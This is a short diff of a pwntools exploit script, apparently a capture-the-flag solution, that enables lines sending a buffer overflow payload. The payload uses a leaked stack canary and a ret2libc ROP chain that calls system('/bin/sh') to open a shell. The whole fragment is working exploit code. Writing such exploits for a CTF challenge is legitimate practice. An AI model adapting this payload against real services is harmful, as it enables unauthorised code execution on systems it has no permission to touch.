@@ -72,12 +72,12 @@ def main():
     log.info(f"system: {hex(system_libc)}")
     log.info(f"bin/sh: {hex(bin_sh)}")
 
-    # p.recvuntil(b">>")
-    # sl(b"4")
-    # p.recvuntil(b"o use (id):")
-    # sl(b"0")
-    # p.recvuntil(b"the spell:")
-    # sl(b"".ljust(0x38,b"\0") + p64(canary) + p64(0) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_libc))
+    p.recvuntil(b">>")
+    sl(b"4")
+    p.recvuntil(b"o use (id):")
+    sl(b"0")
+    p.recvuntil(b"the spell:")
+    sl(b"".ljust(0x38,b"\0") + p64(canary) + p64(0) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_libc))
 
 
 
